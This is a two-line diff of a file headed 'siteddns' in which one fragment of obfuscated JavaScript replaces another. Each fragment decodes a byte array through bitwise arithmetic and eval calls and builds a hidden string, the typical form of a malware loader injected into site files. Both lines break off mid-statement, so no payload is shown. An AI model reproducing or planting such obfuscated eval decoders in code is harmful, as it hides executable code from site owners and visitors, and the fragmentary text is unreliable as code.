@@ -1,2 +1,2 @@
  # siteddns
-=2);";eval(go);go=45;while(go>=4){eo[go]=(eo[go]+eo[go-1])&0xff;go--;}go="for(go=4;;){if(go>43)break;eo[go]=(eo[go]-eo[go+1])&0xff;go++;}";eval(go);fo="";for(go=1;go
+=2);";eval(bd);bd=2;while(true){if(bd>47)break;fc[bd]=(~((((fc[bd]+fc[0])&0xff)-138)&0xff))&0xff;bd++;}ad="";for(bd=1;bd
